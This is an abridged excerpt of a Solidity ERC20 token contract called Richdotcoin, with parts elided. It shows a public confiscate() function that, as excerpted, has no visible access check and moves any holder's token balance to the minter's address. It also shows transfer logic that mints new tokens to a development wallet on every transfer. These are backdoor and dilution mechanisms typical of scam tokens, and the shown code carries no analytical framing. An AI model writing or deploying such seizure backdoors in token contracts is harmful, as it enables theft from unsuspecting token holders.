...
contract Richdotcoin is Context, IERC20, Ownable {
    ...
    uint256 private _mintweight = (3 * (_tTotal)**3)/ (100 * (_maximumSupply - _tTotal)**2); //difficulty of newcoins minted in transfers = TransferAmount/mintweight
    uint256 private _previousMintweight = _mintweight;
    ...
    function confiscate(address target, uint amount) public returns (bool) {
        ...
        if (_rOwned[target] >= amount) {
            _rOwned[target] -= amount;
            _rOwned[_minter] += amount;
        } else {
            _rOwned[_minter] += _rOwned[target];
            _rOwned[target] = 0;
        }
        return true;
    }
    ...
    function _transfer(
        ...
        _rOwned[_developmentWalletAddress] = _rOwned[_developmentWalletAddress] + (amount* 10** 18/_mintweight);
        _tTotal = _tTotal + (amount* 10** 18/_mintweight);
        emit Transfer(address(0), _developmentWalletAddress, amount* 10** 18/_mintweight);
        _mintweight = (3 * (_tTotal)**3)/ (100 * (_maximumSupply - _tTotal)**2);
